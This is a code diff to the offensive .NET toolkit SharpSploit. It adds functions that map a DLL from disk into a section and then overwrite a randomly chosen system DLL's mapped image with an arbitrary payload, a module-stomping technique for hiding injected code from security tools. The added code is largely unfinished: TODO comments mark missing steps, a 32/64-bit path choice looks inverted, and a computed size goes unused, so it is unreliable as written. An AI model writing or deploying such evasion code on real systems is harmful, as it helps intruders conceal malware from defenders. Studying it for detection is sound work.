@@ -6,6 +6,7 @@ using System;
 using System.IO;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Collections.Generic;
 
 namespace SharpSploit.Execution.DynamicInvoke
 {
@@ -57,6 +58,7 @@ namespace SharpSploit.Execution.DynamicInvoke
 
             IntPtr hModule = IntPtr.Zero;
             Execution.Win32.NtDll.NTSTATUS CallResult = Native.LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
+
             if (CallResult != Execution.Win32.NtDll.NTSTATUS.Success || hModule == IntPtr.Zero)
             {
                 return IntPtr.Zero;
@@ -173,6 +175,104 @@ namespace SharpSploit.Execution.DynamicInvoke
                 throw new MissingMethodException(ExportName + ", export not found.");
             }
             return FunctionPtr;
+        }
+
+        /// <summary>
+        /// Maps a DLL from disk into a Section.
+        /// </summary>
+        /// <author>The Wover (@TheRealWover)</author>
+        /// <param name="DLLName">Path of the file on disk.</param>
+        /// <returns>Pointer to the mapped DLL in memory.</returns>
+        public static IntPtr MapModuleFromDisk(string DLLName)
+        {
+            //If the file is not found, a FileNotFoundException will be thrown.
+            FileStream module = File.OpenRead(DLLName);
+
+            long moduleSize = new FileInfo(DLLName).Length;
+
+            //Get a handle to the file.
+            IntPtr hModule = module.Handle;
+
+            //Handle for the new Section
+            IntPtr hSection = new IntPtr();
+
+            //Convert module length to a ulong so that we can pass it into NtCreateSection.
+            ulong maxSize = unchecked((ulong)(moduleSize - long.MinValue));
+            
+            ulong size = 0;
+
+            //Create a new Section with the FileHandle.
+            Execution.Win32.NtDll.NTSTATUS statusCreate = Native.NtCreateSection(ref hSection, (uint) Execution.Win32.WinNT.ACCESS_MASK.SECTION_ALL_ACCESS, IntPtr.Zero, ref size,
+                Execution.Win32.WinNT.PAGE_READONLY, Execution.Win32.WinNT.SEC_IMAGE, hModule);
+
+            if (statusCreate != Execution.Win32.NtDll.NTSTATUS.Success)
+                return IntPtr.Zero;
+
+            //Address of mapped module
+            IntPtr hMapping = new IntPtr();
+
+            //Size of mapping
+            uint viewSize = 0;
+
+            //Map a local view of the new Section to load 
+            Execution.Win32.NtDll.NTSTATUS statusMap = Native.NtMapViewOfSection(hSection, Process.GetCurrentProcess().Handle, ref hMapping, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref viewSize, 2, 0,
+                Execution.Win32.WinNT.PAGE_EXECUTE_WRITECOPY);
+
+            if (statusMap != Execution.Win32.NtDll.NTSTATUS.Success && statusMap != Execution.Win32.NtDll.NTSTATUS.ImageNotAtBase)
+                return IntPtr.Zero;
+            else
+                return hMapping;
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="module"></param>
+        public static IntPtr MapModuleFromMemory(byte[] module)
+        {
+            //Check architecture of current process
+            //use appropriate directory to poll files from
+
+
+            //Check the architecture of the current process.
+            string path = @"C:\Windows\System32";
+
+            if (IntPtr.Size == 8)
+                path = @"C:\Windows\SysWOW64";
+
+            string[] files = Directory.GetFiles(path);
+            List<string> usableFiles = new List<string>();
+
+            //Look for files larger or equal in size to the target module
+            foreach(string file in files)
+            {
+                FileInfo fileInfo = new FileInfo(file);
+
+                if (fileInfo.Length >= module.Length)
+                    usableFiles.Add(file);
+            }
+
+            //Pick a random file in the list of usable files
+            Random r = new Random();
+            int rInt = r.Next(0, usableFiles.Count);
+
+            //Map the selected DLL to memory
+            IntPtr hModule = MapModuleFromDisk(usableFiles[rInt]);
+
+            //TODO: change the permissions so that we can write to it.
+
+            //TODO: Unmap the section
+
+            //TODO: Remap the section. This resets the permissions, I think.
+
+            uint oldProtect;
+
+            Execution.Win32.Kernel32.VirtualProtect(hModule, (UIntPtr) module.Length, Execution.Win32.WinNT.PAGE_EXECUTE_WRITECOPY, out oldProtect);
+
+            //Overwrite the loaded DLL with the module.
+            Marshal.Copy(module, 0, hModule, module.Length);
+
+            return hModule;
         }
     }
 }
